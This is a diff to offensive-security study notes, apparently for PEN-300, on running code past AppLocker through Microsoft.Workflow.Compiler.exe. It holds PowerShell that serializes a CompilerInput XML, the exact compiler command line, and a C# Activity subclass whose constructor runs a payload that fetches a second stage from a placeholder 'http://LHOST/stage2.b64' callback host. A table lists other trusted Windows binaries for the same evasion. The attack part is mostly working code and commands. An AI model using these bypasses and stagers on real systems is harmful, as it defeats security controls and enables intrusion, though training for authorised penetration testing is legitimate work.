@@ -1380,7 +1380,7 @@ If InstallUtil is blocked or missing from the allow list, switch to `Microsoft.W
 - [ ] Confirm the host exists
 - [ ] Craft a C# class that inherits `Activity` and has a constructor
 - [ ] Serialize a CompilerInput XML with `SerializeInputToWrapper`, then invoke the compiler
-- [ ] Confirm payload execution (callback or `results.xml` is created)
+- [ ] Confirm payload execution (callback or `workflow-ran.txt`; `results.xml` alone only records compiler results)
 
 The course path (PEN-300 §13.4) is **serialized CompilerInput XML + a C# `Activity` subclass**, not a raw XOML drop-in:
 
@@ -1393,7 +1393,7 @@ $SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMeth
 Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
 $compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
 $compilerparam.GenerateInMemory = $True
-$pathvar = "test.txt"   # C# Activity subclass source
+$pathvar = "C:\Tools\m05-workflow-compiler-runner.cs"   # C# Activity subclass source
 $output = "C:\Tools\run.xml"
 $tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
 Move-Item $tmp $output
@@ -1402,8 +1402,6 @@ Move-Item $tmp $output
 ```cmd
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 ```
-
-<!-- VERIFY: m05-workflow-compiler-runner.cs is a static Runner (not an Activity subclass) and its header still shows `payload.xoml`. PEN-300 §13.4 uses serialized CompilerInput XML (`run.xml results.xml`) plus a C# class that inherits Activity and has a constructor. Keep the script as a payload sketch; wire it into an Activity (or re-test the header command) before exam use. -->
 
 If the Workflow host is also blocked, try XSL (next section), MSBuild, `regsvr32`, or `mshta`. If the .NET version directory is wrong, enumerate all `v*` under `C:\Windows\Microsoft.NET\Framework*`. If CLM affects PowerShell invocation, call the host via `cmd /c` directly, not through PowerShell. `InstallUtil` reporting "not a valid Win32 application" is usually bitness — switch to the `Framework` (32-bit) directory.
 
@@ -1416,15 +1414,15 @@ Trusted hosts win because they are already on the allow list and you don't drop 
 // Scenario: 23 (InstallUtil blocked by policy, but Workflow compiler host and environment remain)
 // Depends: .NET Framework 4.x; target has C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
 // Usage:
-//   csc.exe /target:library /out:payload.dll m05-workflow-compiler-runner.cs
-//   Microsoft.Workflow.Compiler.exe payload.xoml output.xml
+//   Set $pathvar to this C# source and generate run.xml with SerializeInputToWrapper above.
+//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 // Placeholders: LHOST/LPORT (callback address), STAGE2_URL
 // Test status: not compile-verified (no csc on this host); syntax checked by hand
 //
 // Notes:
-//   - This host compiles and runs an XOML workflow; put payload logic in a static method on the assembly,
-//     invoked by a CodeActivity in the XOML or by the host loading the assembly directly.
-//   - If XOML is awkward to generate, some versions support -r to load this assembly and call Run().
+//   - run.xml is serialized CompilerInput referencing C# source, not raw XOML or a precompiled DLL.
+//   - The compiler instantiates a public, non-abstract Activity subclass via its parameterless constructor.
+//     The constructor below calls Run(); there is no -r switch required by this technique.
 //   - Always use the full path for commands — do not rely on PATH (AppLocker matches by path).
 
 using System;
@@ -1433,10 +1431,14 @@ using System.IO;
 using System.Net;
 using System.Reflection;
 
+using System.Workflow.ComponentModel;
+
 namespace Payload
 {
-    public static class Runner
+    public class Runner : Activity
     {
+        public Runner() { Run(); }
+
         private const string STAGE2_URL = "http://LHOST/stage2.b64";  // ← replace
 
         public static void Run()
@@ -1496,7 +1498,7 @@ namespace Payload
 | Host | Path (use full path; do not rely on PATH) | Input | Scenarios | Notes |
 |---|---|---|---|---|
 | InstallUtil | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe` | Managed assembly DLL | 6, 23 | `/logfile= /LogToConsole=false /U payload.dll` |
-| Workflow Compiler | `...\v4.0.30319\Microsoft.Workflow.Compiler.exe` | XOML + assembly | 23 | `payload.xoml output.xml` |
+| Workflow Compiler | `...\v4.0.30319\Microsoft.Workflow.Compiler.exe` | Serialized CompilerInput XML + C# Activity source | 23 | `run.xml results.xml` |
 | mshta | `C:\Windows\System32\mshta.exe` | `.hta` / URL | 6–8 | Often monitored on its own |
 | msxsl | Not inbox — bring your own | `.xsl` | 24 | Bringing your own introduces a custom file — watch AppLocker |
 | wmic | `C:\Windows\System32\wbem\wmic.exe` | `/format:"x.xsl"` | 24 | May be removed on Win11 24H2+; check `where wmic` first |
